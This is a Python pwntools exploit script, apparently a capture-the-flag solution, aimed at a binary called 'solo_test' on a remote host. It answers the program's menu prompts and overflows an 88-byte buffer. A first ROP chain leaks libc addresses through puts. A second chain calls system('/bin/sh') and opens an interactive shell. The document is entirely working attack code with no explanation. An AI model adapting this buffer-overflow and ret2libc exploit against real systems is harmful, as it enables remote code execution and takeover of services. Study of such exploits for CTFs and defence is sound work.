from pwn import *

context.terminal=['tmux', 'splitw', '-h']

#r = process('./solo_test')
r = remote('115.68.235.72', 1337)
e = ELF('./solo_test')

puts_plt = e.plt['puts']
puts_got = e.got['puts']
read_plt = e.plt['read']
read_got = e.got['read']
pr = 0x400b83
ret = 0x4005f1
start = 0x4006a0
system_offset = 0x30cf0
binsh_offset = 0x12bec4

def main_fnc():
	r.sendlineafter('>> ', "Me")
	r.sendlineafter('>> ', "No")
	r.sendlineafter('>> ', "CTF")
	r.sendlineafter('>> ', "Never")
	r.sendlineafter('>> ', "No")

# Phase 1 - Leak Libc
payload = ''
payload += "A"*88
payload += p64(pr)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(pr)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(start)

#gdb.attach(r)
main_fnc()
r.sendafter('--> ', payload)
recvs = r.recvn(13).split('\x0a')
libc_puts_got = u64(recvs[0].ljust(8, '\x00'))
libc_read_got = u64(recvs[1].ljust(8, '\x00'))
system = libc_puts_got - system_offset
binsh = libc_puts_got + binsh_offset

log.info("puts: "+hex(libc_puts_got))
log.info("read: "+hex(libc_read_got))
log.info("read - puts offset: "+hex(libc_read_got - libc_puts_got))
log.info("system: "+hex(system))
log.info("binsh: "+hex(binsh))

# Phase 2 - Exploit
payload = ''
payload += "A"*88
payload += p64(ret)*9
payload += p64(pr)
payload += p64(binsh)
payload += p64(system)

main_fnc()
r.sendafter('--> ', payload)
r.interactive()
